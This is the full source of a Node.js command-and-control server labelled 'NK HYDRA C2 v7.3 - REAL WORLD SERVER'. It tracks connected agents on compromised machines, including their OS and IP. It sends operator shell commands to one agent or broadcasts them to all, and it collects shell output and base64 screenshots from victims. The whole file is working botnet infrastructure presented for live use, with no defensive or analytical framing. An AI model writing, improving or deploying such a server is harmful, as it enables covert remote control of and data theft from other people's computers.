// NK HYDRA C2 v7.3 - REAL WORLD SERVER
// UPDATED FOR BROADCAST COMMANDS & ROBUST SYNC
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();
app.use(cors());

// --- DASHBOARD UI (SERVED ON /) ---
const dashboardHTML = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NK HYDRA C2 // SERVER NODE</title>
    <style>
        body { background-color: #050505; color: #00ff41; font-family: 'Courier New', monospace; padding: 20px; }
        .node { background: #111; border: 1px solid #333; padding: 15px; margin-bottom: 10px; }
    </style>
</head>
<body>
    <h1>HYDRA C2 [REAL SERVER]</h1>
    <p>Status: ACTIVE</p>
    <p>Please use the NK Console directly.</p>
</body>
</html>
`;

app.get('/', (req, res) => res.send(dashboardHTML));

const server = http.createServer(app);
const io = new Server(server, { 
    cors: { origin: "*" },
    pingTimeout: 60000,
    pingInterval: 25000
});

let agents = [];

io.on('connection', (socket) => {
    // console.log('New connection:', socket.id);

    socket.on('identify', (data) => {
        if(data.type === 'agent') {
            const existing = agents.find(a => a.id === data.id);
            if(existing) {
                existing.socketId = socket.id;
                existing.status = 'Online';
                existing.lastSeen = Date.now();
            } else {
                agents.push({
                    socketId: socket.id,
                    id: data.id || socket.id,
                    type: 'agent',
                    os: data.os || 'Unknown',
                    ip: data.ip || socket.handshake.address,
                    status: 'Online',
                    lastSeen: Date.now()
                });
            }
            // Broadcast update to all UI clients
            io.emit('agents_list', agents);
            io.emit('agent_event', { type: 'SYSTEM', agentId: data.id, payload: 'Agent Connected' });
            console.log(`[+] Agent ${data.id} connected.`);
        } else if (data.type === 'ui') {
             // Immediately send current list to new UI
             socket.emit('agents_list', agents);
        }
    });
    
    socket.on('get_agents', () => {
        socket.emit('agents_list', agents);
    });

    socket.on('disconnect', () => {
        const agent = agents.find(a => a.socketId === socket.id);
        if(agent) {
            agent.status = 'Offline';
            io.emit('agents_list', agents);
            io.emit('agent_event', { type: 'SYSTEM', agentId: agent.id, payload: 'Agent Disconnected' });
            console.log(`[-] Agent ${agent.id} disconnected.`);
        }
    });

    socket.on('stream_log', (data) => {
        io.emit('agent_event', { type: 'SHELL_OUTPUT', agentId: data.from, payload: data.output });
    });
    
    socket.on('upload_file', (data) => {
        io.emit('agent_event', { 
            type: 'SCREENSHOT', 
            agentId: data.target || 'Unknown', 
            payload: data.b64content 
        });
    });

    socket.on('exec_cmd', (data) => {
        const { targetId, cmd } = data;
        console.log(`[CMD] Executing '${cmd}' on ${targetId}`);
        
        if (targetId === 'all') {
            const onlineAgents = agents.filter(a => a.status === 'Online');
            onlineAgents.forEach(agent => {
                io.to(agent.socketId).emit('exec', { cmd });
            });
            io.emit('agent_event', { type: 'SYSTEM', agentId: 'SERVER', payload: `Broadcast command sent to ${onlineAgents.length} agents.` });
        } else {
            const target = agents.find(a => a.id === targetId);
            if(target && target.status === 'Online') {
                io.to(target.socketId).emit('exec', { cmd });
            }
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`HYDRA C2 LISTENING ON PORT ${PORT}`);
});